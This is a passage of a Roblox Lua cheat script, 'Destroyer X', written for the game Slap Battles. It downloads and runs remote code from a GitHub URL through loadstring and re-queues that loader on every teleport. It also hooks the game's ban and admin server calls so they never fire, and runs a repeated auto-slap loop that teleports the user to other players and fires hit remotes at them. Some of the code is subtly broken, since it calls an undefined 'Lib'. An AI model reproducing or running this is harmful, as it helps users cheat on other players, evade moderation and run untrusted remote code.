

print("Starting Destroyer X")
wait(0.1)

local Loading = Instance.new("ScreenGui")
local EndSequence = Instance.new("Frame")
local EndSequenceImage = Instance.new("ImageLabel")
local MainFrame = Instance.new("Frame")
local LogoX = Instance.new("ImageLabel")
local Bar = Instance.new("Frame")
local Percentage = Instance.new("TextLabel")
local UICorner = Instance.new("UICorner")
local Fill = Instance.new("Frame")
local UICorner_2 = Instance.new("UICorner")
local LowerText = Instance.new("TextLabel")
local BackgroundImage = Instance.new("ImageLabel")
local UICorner_3 = Instance.new("UICorner")
local Tip = Instance.new("TextLabel")
local TopText = Instance.new("TextLabel")
local UICorner_4 = Instance.new("UICorner")
local cornerTextLabel = Instance.new("TextLabel")
--Properties:

Loading.Name = "Loading"
Loading.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
Loading.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
Loading.ResetOnSpawn = false

EndSequence.Name = "EndSequence"
EndSequence.Parent = Loading
EndSequence.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
EndSequence.BorderSizePixel = 0
EndSequence.Position = UDim2.new(1, 0, 0, 0)
EndSequence.Size = UDim2.new(1, 0, 1, 0)

EndSequenceImage.Name = "EndSequenceImage"
EndSequenceImage.Parent = EndSequence
EndSequenceImage.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
EndSequenceImage.BackgroundTransparency = 1.000
EndSequenceImage.BorderColor3 = Color3.fromRGB(0, 0, 0)
EndSequenceImage.BorderSizePixel = 0
EndSequenceImage.Size = UDim2.new(0.999739289, 0, 1.00077081, 0)
EndSequenceImage.ZIndex = 0
EndSequenceImage.Image = "rbxassetid://0"
EndSequenceImage.ImageTransparency = 0.200

MainFrame.Name = "MainFrame"
MainFrame.Parent = Loading
MainFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
MainFrame.BackgroundTransparency = 0.100
MainFrame.BorderSizePixel = 0
MainFrame.Position = UDim2.new(0.170531109, 0, 0.126292393, 0)
MainFrame.Size = UDim2.new(0.657815933, 0, 0.747415125, 0)

LogoX.Size = UDim2.new(0, 50, 0, 50) 
LogoX.Position = UDim2.new(0.05, 0, 0.05, 0)  
LogoX.Image = "rbxassetid://17748409757"
LogoX.BackgroundTransparency = 1
LogoX.BorderSizePixel = 0
LogoX.Parent = MainFrame

Bar.Name = "Bar"
Bar.Parent = MainFrame
Bar.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Bar.BorderSizePixel = 0
Bar.Position = UDim2.new(0.179621398, 0, 0.85366267, 0)
Bar.Size = UDim2.new(0.640757024, 0, 0.0553714782, 0)

Percentage.Name = "Percentage"
Percentage.Parent = Bar
Percentage.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Percentage.BackgroundTransparency = 1.000
Percentage.Position = UDim2.new(0.280816972, 0, 0.0909090936, 0)
Percentage.Size = UDim2.new(0.438366145, 0, 0.787879348, 0)
Percentage.Font = Enum.Font.FredokaOne
Percentage.Text = "Loading..."
Percentage.TextColor3 = Color3.fromRGB(0, 0, 0)
Percentage.TextScaled = true
Percentage.TextSize = 14.000
Percentage.TextStrokeColor3 = Color3.fromRGB(1, 56, 255)
Percentage.TextWrapped = true

UICorner.CornerRadius = UDim.new(0, 4)
UICorner.Parent = Bar

cornerTextLabel.Name = "CornerText"
cornerTextLabel.Parent = MainFrame
cornerTextLabel.Text = "Made By Pyrofrost Team"
cornerTextLabel.Font = Enum.Font.JosefinSans
cornerTextLabel.TextSize = 14
cornerTextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
cornerTextLabel.BackgroundTransparency = 1
cornerTextLabel.BorderSizePixel = 0

cornerTextLabel.Size = UDim2.new(0, 150, 0, 30) 
cornerTextLabel.Position = UDim2.new(1, -160, 0, 10)
cornerTextLabel.TextWrapped = true
Fill.Name = "Fill"
Fill.Parent = Bar
Fill.BackgroundColor3 = Color3.fromRGB(255,255,255)
Fill.BorderSizePixel = 0
Fill.Size = UDim2.new(0, 0, 1, 0)

UICorner_2.CornerRadius = UDim.new(0.5, 0)
UICorner_2.Parent = Fill

LowerText.Name = "LowerText"
LowerText.Parent = MainFrame
LowerText.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
LowerText.BackgroundTransparency = 1.000
LowerText.Position = UDim2.new(0.337867588, 0, 0.767594099, 0)
LowerText.Size = UDim2.new(0.311020255, 0, 0.0636178106, 0)
LowerText.Font = Enum.Font.JosefinSans
LowerText.Text = "LowerText"
LowerText.TextColor3 = Color3.fromRGB(255, 255, 255)
LowerText.TextScaled = true
LowerText.TextSize = 14.000
LowerText.TextWrapped = true

BackgroundImage.Name = "BackgroundImage"
BackgroundImage.Parent = MainFrame
BackgroundImage.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
BackgroundImage.BackgroundTransparency = 1.000
BackgroundImage.BorderColor3 = Color3.fromRGB(0, 0, 0)
BackgroundImage.BorderSizePixel = 0
BackgroundImage.Size = UDim2.new(0.999739289, 0, 1.00077081, 0)
BackgroundImage.ZIndex = 0
BackgroundImage.Image = "rbxassetid://0"
BackgroundImage.ImageTransparency = 0.200

UICorner_3.Parent = BackgroundImage

Tip.Name = "Tip"
Tip.Parent = MainFrame
Tip.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Tip.BackgroundTransparency = 1.000
Tip.Position = UDim2.new(0.30, 0, 0.946693778, 0)
Tip.Size = UDim2.new(0.35, 0, 0.025, 0)
Tip.Font = Enum.Font.FredokaOne  
Tip.Text = "Loading.."
Tip.TextColor3 = Color3.fromRGB(255, 255, 255)
Tip.TextSize = 16.000
Tip.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
TopText.Name = "TopText"
TopText.Parent = MainFrame
TopText.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TopText.BackgroundTransparency = 1.000
TopText.Position = UDim2.new(0.183026344, 0, 0.241020337, 0)
TopText.Size = UDim2.new(0.632528603, 0, 0.232815996, 0)
TopText.Font = Enum.Font.FredokaOne
TopText.Text = "Toptext"
TopText.TextColor3 = Color3.fromRGB(255,255, 255)
TopText.TextScaled = true
TopText.TextSize = 14.000
TopText.TextWrapped = true

UICorner_4.Parent = MainFrame

-- Scripts:

local function ETBBEZ_fake_script() 
	local script = Instance.new('LocalScript', Loading)

	local Image = script.Parent.MainFrame.BackgroundImage
	local TopText = script.Parent.MainFrame.TopText
	local LowerText = script.Parent.MainFrame.LowerText
	local Tips = script.Parent.MainFrame.Tip
	local EndingImage = script.Parent.EndSequence.EndSequenceImage
	script.Parent.Enabled = true -- Keep this to true
	
	
	-- SETTINGS
	
	-- Customize The gui here
	
	-- DONT DELETE THIS SCRIPT
	
	
	-- BACKGROUND IMAGE SETTINGS
	
	Image.Image = "rbxassetid://0" -- put Image Id Here Between the / and the " Put 0 for no image
	
	Image.ImageTransparency = 0.3 -- put the transparancy of the image here, 1 is invisable.
	
	-- TEXT SETTINGS
	
	TopText.Text = "Destroyer X " -- Change the Top Text to Anything.
	
	LowerText.Text = "Starting Destroyer X" -- Change the Lower Text to Anything.
	
	-- TIPS
	
	Tips.Visible = true -- False = no tips will show. True = Tips Will Show.
	
	wait(1) -- Diminui o tempo de espera
	Tips.Text = "Starting Gui" -- put any thing Between the Quotation marks Like this "SampleText"
	wait(1) -- Diminui o tempo de espera
	Tips.Text = "Loading Toggles"
	wait(1) -- Diminui o tempo de espera
	Tips.Text = "Loading Anti-Ban"
	wait(1) -- Diminui o tempo de espera
	Tips.Text = "Almost Done"
	wait(1) -- Diminui o tempo de espera
	Tips.Text = "Destroyer X Loaded"
	
	-- ENDING IMAGE SETTINGS
	
	EndingImage.Image = "rbxassetid://0" -- put Image Id Here Between the / and the "
	
	EndingImage.ImageTransparency = 1 -- put the transparancy of the image here, 1 is invisable.
end
coroutine.wrap(ETBBEZ_fake_script)()
local TweenService = game:GetService("TweenService")

local function HZIIXG_fake_script() -- MainFrame.BarManager 
	local script = Instance.new('LocalScript', MainFrame)

	local bar = script.Parent.Bar
	local BarFiller = bar.Fill
	local percentage = bar.Percentage
	
	wait(1) -- Diminui o tempo de espera
	BarFiller:TweenSize(UDim2.new(1,0,1,0), "In", "Linear", 2, true)
	wait(2) 
	script.Parent.Parent.EndSequence:TweenPosition(UDim2.new(0,0,0,0), "InOut", "Quad", 1, true) 
	wait(1) 
	

	local tweenInfo = TweenInfo.new(
		1, 
		Enum.EasingStyle.Linear, 
		Enum.EasingDirection.Out, 
		0, 
		false,
		0 
	)


	local function tweenTransparency(guiObject, endValue)
		local tween = TweenService:Create(guiObject, tweenInfo, {BackgroundTransparency = endValue})
		tween:Play()
		if guiObject:IsA("TextLabel") or guiObject:IsA("TextButton") then
			local textTween = TweenService:Create(guiObject, tweenInfo, {TextTransparency = endValue})
			textTween:Play()
		elseif guiObject:IsA("ImageLabel") or guiObject:IsA("ImageButton") then
			local imageTween = TweenService:Create(guiObject, tweenInfo, {ImageTransparency = endValue})
			imageTween:Play()
		end
	end


	tweenTransparency(script.Parent, 1)
	for _, child in pairs(script.Parent:GetDescendants()) do
		if child:IsA("GuiObject") then
			tweenTransparency(child, 1)
		end
	end
	
	wait(1) 
	
	script.Parent.Visible = false
	script.Parent.Parent.EndSequence:TweenPosition(UDim2.new(-1,0,0,0), "InOut", "Quad", 1, true) 
	wait(1) 
	script.Parent.Parent.Parent.Loading:Destroy()
end
coroutine.wrap(HZIIXG_fake_script)()
wait(4)

local function executeScript()
    local scriptUrl = "https://raw.githubusercontent.com/Aquoupi/DestroyerX/main/DestroyerX"
    local scriptContent = game:HttpGet(scriptUrl)
    loadstring(scriptContent)()
end


local function teleportservice()
    local teleportFunc = queueonteleport or queue_on_teleport or (syn and syn.queue_on_teleport)
    if teleportFunc then
        teleportFunc([[
            if not game:IsLoaded() then
                game.Loaded:Wait()
            end
            repeat wait() until game.Players.LocalPlayer
            wait(4.6)
            loadstring(game:HttpGet("https://raw.githubusercontent.com/Aquoupi/DestroyerX/main/DestroyerX"))()
            wait(0.1) -- Aguarda uma pequena pausa
            print("Success Auto-Load Destroyer X") -- Adiciona a impressão de "Sucesso" após a execução do script
        ]])
    end
end


game.Players.LocalPlayer:GetPropertyChangedSignal("Parent"):Connect(function()
    teleportservice()
end)
wait(0.5)
if game.PlaceId == 6403373529 or game.PlaceId == 11520107397 or game.PlaceId == 9015014224 then
local OrionLib = loadstring(game:HttpGet("https://raw.githubusercontent.com/thanhdat4461/OrionMoblie/main/source"))()

local Window = Lib:MakeWindow({Name = "Destroyer X | Slap Battles ", HidePremium = false, IntroEnabled = true, IntroText = "Destroyer X", IntroIcon = "rbxassetid://17748409757"  ,     Icon = "rbxassetid://17748409757", SaveConfig = true, ConfigFolder = "DestroyerX"})

--Anti Ban (Credits to GiangMc)--

local Namecall
Namecall = hookmetamethod(game, "__namecall", function(self, ...)
   if getnamecallmethod() == "FireServer" and tostring(self) == "Ban" then
       return
   elseif getnamecallmethod() == "FireServer" and tostring(self) == "WalkSpeedChanged" then
       return
   elseif getnamecallmethod() == "FireServer" and tostring(self) == "AdminGUI" then
       return
   end
   return Namecall(self, ...)
end)



-- Tabs

local TabStart = Window:MakeTab({
        Name = "Start",
        Icon = "rbxassetid://7733964719",
        PremiumOnly = false
})


local TabMain = Window:MakeTab({
        Name = "Main",
        Icon = "rbxassetid://7733960981",
        PremiumOnly = false
})

local TabImmunity = Window:MakeTab({
  Name = "Immunity",
          Icon = "rbxassetid://7734056411",
        PremiumOnly = false
})

local TabMisc = Window:MakeTab({
        Name = "Misc",
        Icon = "rbxassetid://8997387110",
        PremiumOnly = false
})



local TabBadges = Window:MakeTab({
        Name = "Badges",
        Icon = "rbxassetid://7734042071",
        PremiumOnly = false
})

local TabTeleports = Window:MakeTab({
        Name = "Teleports",
        Icon = "rbxassetid://7733919427",
        PremiumOnly = false
})

local TabTrolling = Window:MakeTab({
        Name = "Trolling",
        Icon = "rbxassetid://7743873633",
        PremiumOnly = false
})

local TabSetting = Window:MakeTab({
        Name = "Settings",
        Icon = "rbxassetid://7733964370",
        PremiumOnly = false
})

local TabCredits = Window:MakeTab({
        Name = "Credits",
        Icon = "rbxassetid://7743876142",
        PremiumOnly = false
})

local TabLogs = Window:MakeTab({
        Name = "Update Logs",
        Icon = "rbxassetid://7734053039",
        PremiumOnly = false
})


-- Buttons and Toggles


FarmOnToggle = TabMain:AddToggle({
	Name = "Slap Farm ",
	Default = false,
	Callback = function(Value)
	_G.SlapOn = Value
 if _G.SlapOn == true then
   if game.Players.LocalPlayer.Character:FindFirstChild("entered") then
if game.Players.LocalPlayer.leaderstats.Glove.Value == "Default" then
while _G.SlapOn do
local function GetRandomPlayer()
    local players = game.Players:GetPlayers()
    local randomIndex = math.random(1, #players)
    return players[randomIndex]
end

local function TeleportToRandomPlayer(player)
    local randomPlayer = GetRandomPlayer()
    if randomPlayer and randomPlayer.Character and randomPlayer.Character:FindFirstChild("entered") then
        player.Character:SetPrimaryPartCFrame(randomPlayer.Character.PrimaryPart.CFrame)
    else
        print("No available or valid player to  Teleport to.")
    end
end

local player = game.Players.LocalPlayer
if player then
    TeleportToRandomPlayer(player)
else
    print("No Players to Teleport.")
end

wait(0.5)
local players = game:GetService("Players"):GetPlayers()
local originPosition = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position -- If its being executed on a client
local closestPlayer = nil
local closestDistance = math.huge

for _, player in ipairs(players) do
    if player ~= game:GetService("Players").LocalPlayer then -- Random Child thing.
        local playerPosition = player.Character.HumanoidRootPart.Position
        local distance = (playerPosition - originPosition).magnitude
        if distance < closestDistance then
            closestPlayer = player
            closestDistance = distance
        end
    end
end

if closestPlayer then
    local args = {
        [1] = closestPlayer.Character.Torso
    }

    game:GetService("ReplicatedStorage").b:FireServer(unpack(args))
else
    print("There is no players , only the local player. ")
end
task.wait(0.7)
end
elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "Dual" then
  while _G.SlapOn do

local function GetRandomPlayer()
    local players = game.Players:GetPlayers()
    local randomIndex = math.random(1, #players)
    return players[randomIndex]
end

local function TeleportToRandomPlayer(player)
    local randomPlayer = GetRandomPlayer()
    if randomPlayer and randomPlayer.Character and randomPlayer.Character:FindFirstChild("entered") then
        player.Character:SetPrimaryPartCFrame(randomPlayer.Character.PrimaryPart.CFrame)
    else
        print("No available or valid player to  Teleport to.")
    end
end

local player = game.Players.LocalPlayer
if player then
    TeleportToRandomPlayer(player)
else
    print("No Players to Teleport.")
end
wait(0.5)
local players = game:GetService("Players"):GetPlayers()
local originPosition = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position -- If its being executed on a client
local closestPlayer = nil
local closestDistance = math.huge

for _, player in ipairs(players) do
    if player ~= game:GetService("Players").LocalPlayer then -- Random Child thing.
        local playerPosition = player.Character.HumanoidRootPart.Position
        local distance = (playerPosition - originPosition).magnitude
        if distance < closestDistance then
            closestPlayer = player
            closestDistance = distance
        end
    end
end

if closestPlayer then
    local args = {
        [1] = closestPlayer.Character.Torso
    }

    game:GetService("ReplicatedStorage").GeneralHit:FireServer(unpack(args))
else
    print("There is no players , only the local player. ")
end
task.wait(0.7)
    end
elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "ZZZZZZZ" then
  while _G.SlapOn do

local function GetRandomPlayer()
    local players = game.Players:GetPlayers()
    local randomIndex = math.random(1, #players)
    return players[randomIndex]
end

local function TeleportToRandomPlayer(player)
    local randomPlayer = GetRandomPlayer()
    if randomPlayer and randomPlayer.Character and randomPlayer.Character:FindFirstChild("entered") then
        player.Character:SetPrimaryPartCFrame(randomPlayer.Character.PrimaryPart.CFrame)
    else
        print("No available or valid player to  Teleport to.")
    end
end

local player = game.Players.LocalPlayer
if player then
    TeleportToRandomPlayer(player)
else
    print("No Players to Teleport.")
end
wait(0.5)
local players = game:GetService("Players"):GetPlayers()
local originPosition = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position -- If its being executed on a client
local closestPlayer = nil
local closestDistance = math.huge

for _, player in ipairs(players) do
    if player ~= game:GetService("Players").LocalPlayer then -- Random Child thing.
        local playerPosition = player.Character.HumanoidRootPart.Position
        local distance = (playerPosition - originPosition).magnitude
        if distance < closestDistance then
            closestPlayer = player
            closestDistance = distance
        end
    end
end

if closestPlayer then
    local args = {
        [1] = closestPlayer.Character.Torso
    }

    game:GetService("ReplicatedStorage").ZZZZZZZHit:FireServer(unpack(args))
else
    print("There is no players , only the local player. ")
end
task.wait(0.7)
  end
  elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "Diamond" then
  while _G.SlapOn do

local function GetRandomPlayer()
    local players = game.Players:GetPlayers()
    local randomIndex = math.random(1, #players)
    return players[randomIndex]
end

local function TeleportToRandomPlayer(player)
    local randomPlayer = GetRandomPlayer()
    if randomPlayer and randomPlayer.Character and randomPlayer.Character:FindFirstChild("entered") then
        player.Character:SetPrimaryPartCFrame(randomPlayer.Character.PrimaryPart.CFrame)
    else
        print("No available or valid player to  Teleport to.")
    end
end

local player = game.Players.LocalPlayer
if player then
    TeleportToRandomPlayer(player)
else
    print("No Players to Teleport.")
end
wait(0.5)
local players = game:GetService("Players"):GetPlayers()
local originPosition = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position -- If its being executed on a client
local closestPlayer = nil
local closestDistance = math.huge

for _, player in ipairs(players) do
    if player ~= game:GetService("Players").LocalPlayer then -- Random Child thing.
        local playerPosition = player.Character.HumanoidRootPart.Position
        local distance = (playerPosition - originPosition).magnitude
        if distance < closestDistance then
            closestPlayer = player
            closestDistance = distance
        end
    end
end

if closestPlayer then
    local args = {
        [1] = closestPlayer.Character.Torso
    }

    game:GetService("ReplicatedStorage").DiamondHit:FireServer(unpack(args))
else
    print("There is no players , only the local player. ")
end
task.wait(0.7)
  end
  elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "Extended" then
  while _G.SlapOn do

local function GetRandomPlayer()
    local players = game.Players:GetPlayers()
    local randomIndex = math.random(1, #players)
    return players[randomIndex]
end

local function TeleportToRandomPlayer(player)
    local randomPlayer = GetRandomPlayer()
    if randomPlayer and randomPlayer.Character and randomPlayer.Character:FindFirstChild("entered") then
        player.Character:SetPrimaryPartCFrame(randomPlayer.Character.PrimaryPart.CFrame)
    else
        print("No available or valid player to  Teleport to.")
    end
end

local player = game.Players.LocalPlayer
if player then
    TeleportToRandomPlayer(player)
else
    print("No Players to Teleport.")
end
wait(0.5)
local players = game:GetService("Players"):GetPlayers()
local originPosition = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position -- If its being executed on a client
local closestPlayer = nil
local closestDistance = math.huge

for _, player in ipairs(players) do
    if player ~= game:GetService("Players").LocalPlayer then -- Random Child thing.
        local playerPosition = player.Character.HumanoidRootPart.Position
        local distance = (playerPosition - originPosition).magnitude
        if distance < closestDistance then
            closestPlayer = player
            closestDistance = distance
        end
    end
end

if closestPlayer then
    local args = {
        [1] = closestPlayer.Character.Torso
    }

    game:GetService("ReplicatedStorage").b:FireServer(unpack(args))
else
    print("There is no players , only the local player. ")
end
task.wait(0.7)
  end
elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "Brick" then
  while _G.SlapOn do

local function GetRandomPlayer()
    local players = game.Players:GetPlayers()
    local randomIndex = math.random(1, #players)
    return players[randomIndex]
end

local function TeleportToRandomPlayer(player)
    local randomPlayer = GetRandomPlayer()
    if randomPlayer and randomPlayer.Character and randomPlayer.Character:FindFirstChild("entered") then
        player.Character:SetPrimaryPartCFrame(randomPlayer.Character.PrimaryPart.CFrame)
    else
        print("No available or valid player to  Teleport to.")
    end
end

local player = game.Players.LocalPlayer
if player then
    TeleportToRandomPlayer(player)
else
    print("No Players to Teleport.")
end
wait(0.5)
local players = game:GetService("Players"):GetPlayers()
local originPosition = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position -- If its being executed on a client
local closestPlayer = nil
local closestDistance = math.huge

for _, player in ipairs(players) do
    if player ~= game:GetService("Players").LocalPlayer then -- Random Child thing.
        local playerPosition = player.Character.HumanoidRootPart.Position
        local distance = (playerPosition - originPosition).magnitude
        if distance < closestDistance then
            closestPlayer = player
            closestDistance = distance
        end
    end
end

if closestPlayer then
    local args = {
        [1] = closestPlayer.Character.Torso
    }

    game:GetService("ReplicatedStorage").BrickHit:FireServer(unpack(args))
else
    print("There is no players , only the local player. ")
end
task.wait(0.7)
  end
elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "Snow" then 
  while _G.SlapOn do

local function GetRandomPlayer()
    local players = game.Players:GetPlayers()
    local randomIndex = math.random(1, #players)
    return players[randomIndex]
end

local function TeleportToRandomPlayer(player)
    local randomPlayer = GetRandomPlayer()
    if randomPlayer and randomPlayer.Character and randomPlayer.Character:FindFirstChild("entered") then
        player.Character:SetPrimaryPartCFrame(randomPlayer.Character.PrimaryPart.CFrame)
    else
        print("No available or valid player to  Teleport to.")
    end
end

local player = game.Players.LocalPlayer
if player then
    TeleportToRandomPlayer(player)
else
    print("No Players to Teleport.")
end
wait(0.5)
local players = game:GetService("Players"):GetPlayers()
local originPosition = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position -- If its being executed on a client
local closestPlayer = nil
local closestDistance = math.huge

for _, player in ipairs(players) do
    if player ~= game:GetService("Players").LocalPlayer then -- Random Child thing.
        local playerPosition = player.Character.HumanoidRootPart.Position
        local distance = (playerPosition - originPosition).magnitude
        if distance < closestDistance then
            closestPlayer = player
            closestDistance = distance
        end
    end
end

if closestPlayer then
    local args = {
        [1] = closestPlayer.Character.Torso
    }

    game:GetService("ReplicatedStorage").SnowHit:FireServer(unpack(args))
else
    print("There is no players , only the local player. ")
end
task.wait(0.7)
  end
elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "Pull" then
  while _G.SlapOn do

local function GetRandomPlayer()
    local players = game.Players:GetPlayers()
    local randomIndex = math.random(1, #players)
    return players[randomIndex]
end

local function TeleportToRandomPlayer(player)
    local randomPlayer = GetRandomPlayer()
    if randomPlayer and randomPlayer.Character and randomPlayer.Character:FindFirstChild("entered") then
        player.Character:SetPrimaryPartCFrame(randomPlayer.Character.PrimaryPart.CFrame)
    else
        print("No available or valid player to  Teleport to.")
    end
end

local player = game.Players.LocalPlayer
if player then
    TeleportToRandomPlayer(player)
else
    print("No Players to Teleport.")
end
wait(0.5)
local players = game:GetService("Players"):GetPlayers()
local originPosition = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position -- If its being executed on a client
local closestPlayer = nil
local closestDistance = math.huge

for _, player in ipairs(players) do
    if player ~= game:GetService("Players").LocalPlayer then -- Random Child thing.
        local playerPosition = player.Character.HumanoidRootPart.Position
        local distance = (playerPosition - originPosition).magnitude
        if distance < closestDistance then
            closestPlayer = player
            closestDistance = distance
        end
    end
end

if closestPlayer then
    local args = {
        [1] = closestPlayer.Character.Torso
    }

    game:GetService("ReplicatedStorage").PullHit:FireServer(unpack(args))
else
    print("There is no players , only the local player. ")
end
task.wait(0.7)
  end
elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "Flash" then
  while _G.SlapOn do

local function GetRandomPlayer()
    local players = game.Players:GetPlayers()
    local randomIndex = math.random(1, #players)
    return players[randomIndex]
end

local function TeleportToRandomPlayer(player)
    local randomPlayer = GetRandomPlayer()
    if randomPlayer and randomPlayer.Character and randomPlayer.Character:FindFirstChild("entered") then
        player.Character:SetPrimaryPartCFrame(randomPlayer.Character.PrimaryPart.CFrame)
    else
        print("No available or valid player to  Teleport to.")
    end
end

local player = game.Players.LocalPlayer
if player then
    TeleportToRandomPlayer(player)
else
    print("No Players to Teleport.")
end
wait(0.5)
local players = game:GetService("Players"):GetPlayers()
local originPosition = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position -- If its being executed on a client
local closestPlayer = nil
local closestDistance = math.huge

for _, player in ipairs(players) do
    if player ~= game:GetService("Players").LocalPlayer then -- Random Child thing.
        local playerPosition = player.Character.HumanoidRootPart.Position
        local distance = (playerPosition - originPosition).magnitude
        if distance < closestDistance then
            closestPlayer = player
            closestDistance = distance
        end
    end
end

if closestPlayer then
    local args = {
        [1] = closestPlayer.Character.Torso
    }

    game:GetService("ReplicatedStorage").FlashHit:FireServer(unpack(args))
else
    print("There is no players , only the local player. ")
end
task.wait(0.7)
  end
elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "Spring" then
  while _G.SlapOn do

local function GetRandomPlayer()
    local players = game.Players:GetPlayers()
    local randomIndex = math.random(1, #players)
    return players[randomIndex]
end

local function TeleportToRandomPlayer(player)
    local randomPlayer = GetRandomPlayer()
    if randomPlayer and randomPlayer.Character and randomPlayer.Character:FindFirstChild("entered") then
        player.Character:SetPrimaryPartCFrame(randomPlayer.Character.PrimaryPart.CFrame)
    else
        print("No available or valid player to  Teleport to.")
    end
end

local player = game.Players.LocalPlayer
if player then
    TeleportToRandomPlayer(player)
else
    print("No Players to Teleport.")
end
wait(0.5)
local players = game:GetService("Players"):GetPlayers()
local originPosition = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position -- If its being executed on a client
local closestPlayer = nil
local closestDistance = math.huge

for _, player in ipairs(players) do
    if player ~= game:GetService("Players").LocalPlayer then -- Random Child thing.
        local playerPosition = player.Character.HumanoidRootPart.Position
        local distance = (playerPosition - originPosition).magnitude
        if distance < closestDistance then
            closestPlayer = player
            closestDistance = distance
        end
    end
end

if closestPlayer then
    local args = {
        [1] = closestPlayer.Character.Torso
    }

    game:GetService("ReplicatedStorage").springhit:FireServer(unpack(args))
else
    print("There is no players , only the local player. ")
end
task.wait(0.7)
  end
elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "Swapper" then
  while _G.SlapOn do

local function GetRandomPlayer()
    local players = game.Players:GetPlayers()
    local randomIndex = math.random(1, #players)
    return players[randomIndex]
end

local function TeleportToRandomPlayer(player)
    local randomPlayer = GetRandomPlayer()
    if randomPlayer and randomPlayer.Character and randomPlayer.Character:FindFirstChild("entered") then
        player.Character:SetPrimaryPartCFrame(randomPlayer.Character.PrimaryPart.CFrame)
    else
        print("No available or valid player to  Teleport to.")
    end
end

local player = game.Players.LocalPlayer
if player then
    TeleportToRandomPlayer(player)
else
    print("No Players to Teleport.")
end
wait(0.5)
local players = game:GetService("Players"):GetPlayers()
local originPosition = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position -- If its being executed on a client
local closestPlayer = nil
local closestDistance = math.huge

for _, player in ipairs(players) do
    if player ~= game:GetService("Players").LocalPlayer then -- Random Child thing.
        local playerPosition = player.Character.HumanoidRootPart.Position
        local distance = (playerPosition - originPosition).magnitude
        if distance < closestDistance then
            closestPlayer = player
            closestDistance = distance
        end
    end
end

if closestPlayer then
    local args = {
        [1] = closestPlayer.Character.Torso
    }

    game:GetService("ReplicatedStorage").HitSwapper:FireServer(unpack(args))
else
    print("There is no players , only the local player. ")
end
task.wait(0.7)
  end
elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "Bull" then
  while _G.SlapOn do

local function GetRandomPlayer()
    local players = game.Players:GetPlayers()
    local randomIndex = math.random(1, #players)
    return players[randomIndex]
end

local function TeleportToRandomPlayer(player)
    local randomPlayer = GetRandomPlayer()
    if randomPlayer and randomPlayer.Character and randomPlayer.Character:FindFirstChild("entered") then
        player.Character:SetPrimaryPartCFrame(randomPlayer.Character.PrimaryPart.CFrame)
    else
        print("No available or valid player to  Teleport to.")
    end
end

local player = game.Players.LocalPlayer
if player then
    TeleportToRandomPlayer(player)
else
    print("No Players to Teleport.")
end
wait(0.5)
local players = game:GetService("Players"):GetPlayers()
local originPosition = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position -- If its being executed on a client
local closestPlayer = nil
local closestDistance = math.huge

for _, player in ipairs(players) do
    if player ~= game:GetService("Players").LocalPlayer then -- Random Child thing.
        local playerPosition = player.Character.HumanoidRootPart.Position
        local distance = (playerPosition - originPosition).magnitude
        if distance < closestDistance then
            closestPlayer = player
            closestDistance = distance
        end
    end
end

if closestPlayer then
    local args = {
        [1] = closestPlayer.Character.Torso
    }

    game:GetService("ReplicatedStorage").BullHit:FireServer(unpack(args))
else
    print("There is no players , only the local player. ")
end
task.wait(0.7)
  end
elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "Dice" then
  while _G.SlapOn do

local function GetRandomPlayer()
    local players = game.Players:GetPlayers()
    local randomIndex = math.random(1, #players)
    return players[randomIndex]
end

local function TeleportToRandomPlayer(player)
    local randomPlayer = GetRandomPlayer()
    if randomPlayer and randomPlayer.Character and randomPlayer.Character:FindFirstChild("entered") then
        player.Character:SetPrimaryPartCFrame(randomPlayer.Character.PrimaryPart.CFrame)
    else
        print("No available or valid player to  Teleport to.")
    end
end

local player = game.Players.LocalPlayer
if player then
    TeleportToRandomPlayer(player)
else
    print("No Players to Teleport.")
end
wait(0.5)
local players = game:GetService("Players"):GetPlayers()
local originPosition = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position -- If its being executed on a client
local closestPlayer = nil
local closestDistance = math.huge

for _, player in ipairs(players) do
    if player ~= game:GetService("Players").LocalPlayer then -- Random Child thing.
        local playerPosition = player.Character.HumanoidRootPart.Position
        local distance = (playerPosition - originPosition).magnitude
        if distance < closestDistance then
            closestPlayer = player
            closestDistance = distance
        end
    end
end

if closestPlayer then
    local args = {
        [1] = closestPlayer.Character.Torso
    }

    game:GetService("ReplicatedStorage").DiceHit:FireServer(unpack(args))
else
    print("There is no players , only the local player. ")
end
task.wait(0.7)
  end
elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "Ghost" then
  while _G.SlapOn do

local function GetRandomPlayer()
    local players = game.Players:GetPlayers()
    local randomIndex = math.random(1, #players)
    return players[randomIndex]
end

local function TeleportToRandomPlayer(player)
    local randomPlayer = GetRandomPlayer()
